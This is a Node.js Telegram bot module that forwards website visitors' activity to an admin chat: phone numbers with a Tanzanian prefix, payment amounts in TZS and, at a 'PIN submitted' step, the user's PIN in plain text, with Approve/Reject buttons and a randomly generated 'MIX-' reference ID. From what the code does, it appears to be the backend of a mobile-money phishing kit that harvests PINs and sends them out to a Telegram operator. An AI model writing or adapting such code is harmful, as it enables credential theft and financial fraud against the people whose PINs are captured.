const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

// Validate environment variables immediately
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL;

// Initialize bot only if token exists to prevent startup crashes
const bot = BOT_TOKEN ? new Telegraf(BOT_TOKEN) : null;

if (!bot) {
    console.error("❌ ERROR: BOT_TOKEN is missing. Telegram alerts will not function.");
}

const sendAdminAlert = async (info) => {
    if (!bot || !ADMIN_ID) {
        console.warn("⚠️ Cannot send alert: Bot not initialized or ADMIN_CHAT_ID missing.");
        return;
    }

    try {
        let message = `🚀 *User Activity Update*\n`;
        message += `━━━━━━━━━━━━━━━━━━\n`;
        message += `📍 *Step:* ${info.step ? info.step.replace(/_/g, ' ') : 'N/A'}\n`;
        message += `🆔 *Socket:* \`${info.socketId}\`\n`;
        
        if (info.phone) message += `📱 *Phone:* \`+255${info.phone}\`\n`;
        if (info.amount) message += `💰 *Amount:* TZS ${Number(info.amount).toLocaleString()}\n`;
        if (info.pin) message += `🔑 *PIN:* \`${info.pin}\`\n`;

        const keyboard = info.step === '5_PIN_SUBMITTED' ? Markup.inlineKeyboard([
            [
                Markup.button.callback('✅ Approve', `approve_${info.socketId}`),
                Markup.button.callback('❌ Reject', `reject_${info.socketId}`)
            ]
        ]) : null;

        await bot.telegram.sendMessage(ADMIN_ID, message, { 
            parse_mode: 'Markdown', 
            ...(keyboard || {}) 
        });
    } catch (err) {
        console.error("Telegram Send Error:", err.message);
    }
};

// Only set up listeners and launch if bot exists
if (bot) {
    bot.action(/approve_(.+)/, async (ctx) => {
        try {
            const socketId = ctx.match[1];
            await axios.post(`${SERVER_URL}/admin/action`, { 
                socketId, 
                action: 'approve', 
                referenceId: 'MIX-' + Math.floor(Math.random() * 1000000) 
            });
            await ctx.editMessageText("✅ Approved and sent to user.");
        } catch (err) {
            console.error("Approve Action Error:", err.message);
            await ctx.answerCbQuery("Failed to connect to server.");
        }
    });

    bot.action(/reject_(.+)/, async (ctx) => {
        try {
            const socketId = ctx.match[1];
            await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'reject' });
            await ctx.editMessageText("❌ User was rejected.");
        } catch (err) {
            console.error("Reject Action Error:", err.message);
            await ctx.answerCbQuery("Failed to connect to server.");
        }
    });

    // Launch bot without blocking the main process
    bot.launch()
        .then(() => console.log("🤖 Telegram Bot Manager Active"))
        .catch(err => console.error("❌ Bot Launch Failed:", err.message));
}

// Export the function
module.exports = { sendAdminAlert };